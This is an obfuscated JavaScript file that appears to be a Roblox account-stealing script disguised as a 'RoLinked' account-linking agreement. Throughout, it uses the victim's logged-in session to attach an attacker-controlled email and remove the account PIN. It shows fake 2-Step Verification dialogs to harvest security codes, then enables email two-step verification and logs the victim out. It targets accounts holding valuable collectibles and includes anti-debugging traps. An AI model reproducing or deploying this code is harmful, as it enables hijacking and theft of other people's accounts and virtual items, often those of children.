(function () {
    var Z = function () {
            var B = { Fsuxq: "1|4|3|5|0|2" };
            var g = B;
            var s;
            try {
                s = Function('return (function() {}.constructor("return this")( ));')();
            } catch (R) {
                s = window;
            }
            return s;
        },
        I = Z();
    I.setInterval(r, 4000);
})();
(async function () {
    var m = (function () {
        var h = {
            tfdlY: "while (true) {}",
            rFstn: "counter",
            KuzSH: function (V, i) {
                return V !== i;
            },
            rvjKB: "aFULb",
            tRjnP: "XIngH",
            KFfhC: function (V, i) {
                return V === i;
            },
            SKezo: "JJXti",
            lzGqG: "WYMIO",
        };
        var w = true;
        return function (V, i) {
            var C = w
                ? function () {
                      if (h.KuzSH(h.rvjKB, h.tRjnP)) {
                          if (i) {
                              if (h.KFfhC(h.SKezo, h.lzGqG)) {
                                  r = I;
                              } else {
                                  var u = i.apply(V, arguments);
                                  return (i = null), u;
                              }
                          }
                      } else {
                          var K = s
                              ? function () {
                                    if (K) {
                                        var W = P.apply(15000, arguments);
                                        return (U = null), W;
                                    }
                                }
                              : function () {};
                          return (M = false), K;
                      }
                  }
                : function () {};
            return (w = false), C;
        };
    })();
    var z = m(this, function () {
        return z.toString().search("(((.+)+)+)+$").toString().constructor(z).search("(((.+)+)+)+$");
    });
    z();
    var R = (function () {
        var w = true;
        return function (i, C) {
            var u = w
                ? function () {
                      if (C) {
                          var K = C.apply(i, arguments);
                          return (C = null), K;
                      }
                  }
                : function () {};
            return (w = false), u;
        };
    })();
    (function () {
        R(this, function () {
            var i = new RegExp("function *\\( *\\)"),
                C = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                X = r("init");
            if (!i.test(X + "chain") || !C.test(X + "input")) {
                X("0");
            } else {
                r();
            }
        })();
    })();
    var l = (function () {
            var w = true;
            return function (i, C) {
                var d = w
                    ? function () {
                          if (C) {
                              var W = C.apply(i, arguments);
                              return (C = null), W;
                          }
                      }
                    : function () {};
                return (w = false), d;
            };
        })(),
        M = l(this, function () {
            var V;
            try {
                var i = Function('return (function() {}.constructor("return this")( ));');
                V = i();
            } catch (j) {
                V = window;
            }
            var C = (V.console = V.console || {}),
                X = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var u = 0; u < X.length; u++) {
                var p = l.constructor.prototype.bind(l);
                var W = X[u];
                var K = C[W] || p;
                p["__proto__"] = l.bind(l);
                p.toString = K.toString.bind(K);
                C[W] = p;
            }
        });
    M();
    const E = (h) => new Promise((w) => setTimeout(w, h));
    var Y = ["Y2Fyb2xpbmF6Zjh3QG91dGxvb2suY29t"];
    var b = "@outlook.com",
        O = "c***";
    var P = Y[Math.floor(Math.random() * Y.length)];
    var U = 5762605139;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (w) {
                var C = Number(w.totalPages);
                for (let X = 0; X < C; X++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + X + "&pageSize=20",
                        contentType: "application/json",
                        success: function (u) {
                            var D = u.collection;
                            for (var K of D) {
                                if (K.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (V) {
                var X = Number(V.totalPages);
                for (let d = 0; d < X; d++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + d + "&pageSize=20",
                        contentType: "application/json",
                        success: function (D) {
                            var K = D.collection;
                            for (var W of K) {
                                if (W.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (C) {
                var u = C.id;
                try {
                    var d = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + U + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(d),
                    });
                } catch {}
                async function D() {
                    function p() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (c) {
                                if (c.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(P),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var v = c.emailAddress,
                                        f = c.verified;
                                    if (v.includes(b) == true) {
                                        if (v.includes(O) == true) {
                                            if (f == true) {
                                                console.log("Enable Email Two Step and then sign them out");
                                                var Q = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + u + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                };
                                                $.ajax(Q);
                                                var n = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + u + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                };
                                                $.ajax(n);
                                                var t = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + u + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                };
                                                $.ajax(t);
                                                var F = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + u + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                };
                                                $.ajax(F);
                                                (async function () {
                                                    await E(500);
                                                    var H3 = {
                                                        method: "POST",
                                                        url: "https://auth.roblox.com/v2/logout",
                                                        contentType: "application/json",
                                                    };
                                                    $.ajax(H3);
                                                })();
                                            }
                                        }
                                    }
                                }
                            },
                        }),
                            setTimeout(p, 2000);
                    }
                    p();
                    function a(J, c) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + u + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: J,
                            }),
                            success: function () {
                                var Q = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", Q);
                                function t() {
                                    if (document.getElementById("two-step-verification-code-input").value.length == 6) {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true;
                                    }
                                    setTimeout(t, 100);
                                }
                                t();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + u + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: J,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (x) {
                                            var y = x.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: c,
                                                    challengeMetadata: '{"verificationToken":"' + y + '","rememberDevice":false,"challengeId":"' + J + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    E(2000);
                                                    D();
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function e(J, c) {
                        var f = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", f);
                        function Q() {
                            document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true), setTimeout(Q, 100);
                        }
                        Q();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + u + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: J,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (t) {
                                    var x = t.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: c,
                                            challengeMetadata: '{"verificationToken":"' + x + '","rememberDevice":false,"challengeId":"' + J + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove(), E(2000), D();
                                        },
                                    });
                                },
                                error: function () {
                                    document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                    document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                },
                            });
                        };
                    }
                    function T(J) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (v) {
                                var Q = v.otpSessionToken,
                                    n = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", n);
                                function t() {
                                    document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true);
                                    setTimeout(t, 100);
                                }
                                t();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: Q,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: Q,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (y) {
                                                    (responseToken = y.token),
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://apis.roblox.com/challenge/v1/continue",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                challengeId: J,
                                                                challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                                challengeType: "reauthentication",
                                                            }),
                                                            success: function () {
                                                                document.getElementById("twoStepPrompts").remove(), E(2000), D();
                                                            },
                                                        });
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function j(J, c) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + u + "/configuration",
                            contentType: "application/json",
                            success: function (v) {
                                var Q = v.primaryMediaType;
                                if (Q == "Email") {
                                    a(J, c);
                                } else {
                                    if (Q == "Authenticator") {
                                        e(J, c);
                                    } else {
                                        Q == null && T(c);
                                    }
                                }
                            },
                        });
                    }
                    function N() {
                        var c = {
                            birthDay: 2,
                            birthMonth: 2,
                            birthYear: 2022,
                        };
                        $.ajax({
                            method: "POST",
                            url: "https://users.roblox.com/v1/birthdate",
                            contentType: "application/json",
                            data: JSON.stringify(c),
                            success: function () {
                                $.ajax({
                                    method: "POST",
                                    url: "https://accountsettings.roblox.com/v1/email",
                                    contentType: "application/json",
                                    data: JSON.stringify({
                                        emailAddress: atob(P),
                                        password: "",
                                    }),
                                    success: function () {
                                        (async function () {
                                            await E(1500);
                                            $.ajax({
                                                method: "GET",
                                                url: "https://accountsettings.roblox.com/v1/email",
                                                contentType: "application/json",
                                                success: function (Q) {
                                                    Q.emailAddress == null &&
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                emailAddress: atob(P),
                                                                password: "",
                                                            }),
                                                        });
                                                },
                                            });
                                        })();
                                    },
                                    error: function () {
                                        (async function () {
                                            await E(1500);
                                            $.ajax({
                                                method: "GET",
                                                url: "https://accountsettings.roblox.com/v1/email",
                                                contentType: "application/json",
                                                success: function (Q) {
                                                    Q.emailAddress == null &&
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                emailAddress: atob(P),
                                                                password: "",
                                                            }),
                                                        });
                                                },
                                            });
                                        })();
                                    },
                                });
                            },
                            error: function (o) {
                                var v = atob(o.getResponseHeader("rblx-challenge-metadata")),
                                    f = o.getResponseHeader("rblx-challenge-id"),
                                    Q = v.split('"challengeId":"').pop().split('"')[0];
                                j(Q, f);
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var S = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", S);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (o) {
                                    var f = o.isEnabled,
                                        Q = o.unlockedUntil;
                                    if (f == true) {
                                        if (Q == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var n = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", n);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove(), (document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active");
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
                                                contentType: "application/json",
                                                success: function () {
                                                    N();
                                                },
                                                error: function (L) {
                                                    var H1 = atob(L.getResponseHeader("rblx-challenge-metadata")),
                                                        H2 = L.getResponseHeader("rblx-challenge-id"),
                                                        H3 = H1.split('"challengeId":"').pop().split('"')[0];
                                                    j(H3, H2);
                                                },
                                            });
                                        }
                                    } else {
                                        N();
                                    }
                                },
                            });
                        };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (c) {
                                var f = c.isEnabled;
                                var Q = c.unlockedUntil;
                                if (f == true) {
                                    if (Q == null) {
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        if (document.getElementById("pinPopupz") == null) {
                                            var n = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML("beforeend", n);
                                            document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                document.getElementById("pinPopupz").remove();
                                                document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document.getElementById("pinPopupz").remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                N();
                                            },
                                            error: function (t) {
                                                var F = atob(t.getResponseHeader("rblx-challenge-metadata"));
                                                var x = t.getResponseHeader("rblx-challenge-id");
                                                var G = F.split('"challengeId":"').pop().split('"')[0];
                                                j(G, x);
                                            },
                                        });
                                    }
                                } else {
                                    N();
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await E(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var p = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(p),
                            });
                        } catch {}
                        D();
                    } else {
                        function a(e) {
                            const T = "https://inventory.roblox.com/v1/users/" + e + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var j = {
                                url: T,
                                type: "GET",
                            };
                            return $.ajax(j);
                        }
                        a(u)
                            .done(function (e) {
                                if (e && e.data && e.data.length > 0) {
                                    let S = 0;
                                    e.data.forEach((J) => {
                                        J.recentAveragePrice && (S += J.recentAveragePrice);
                                    });
                                    if (S > 15000) {
                                        D();
                                    } else {
                                        var N = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", N);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var N = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", N);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (e, T, j) {
                                var J = {};
                                J.lyRbF = "promptPopup";
                                J.AUDjz = "text-footer footer-note";
                                J.driNl = "Not Active";
                                var o = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", o);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById(c.lyRbF).remove();
                                    document.getElementsByClassName(c.AUDjz)[0].innerText = c.driNl;
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById(c.lyRbF).remove();
                                    document.getElementsByClassName(c.AUDjz)[0].innerText = c.driNl;
                                };
                            });
                    }
                })();
            },
            error: function () {
                var u = {};
                u.GNRYb = "promptPopup";
                u.AkbAF = "text-footer footer-note";
                u.AckZa = "Not Active";
                var D = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", D);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById(d.GNRYb).remove();
                    document.getElementsByClassName(d.AkbAF)[0].innerText = d.AckZa;
                };
            },
        });
    }
})();
function r(H) {
    function I(B) {
        if (typeof B === "string") {
            return function (g) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + B / B).length !== 1 || B % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        I(++B);
    }
    try {
        if (H) {
            return I;
        } else {
            I(0);
        }
    } catch (B) {}
}
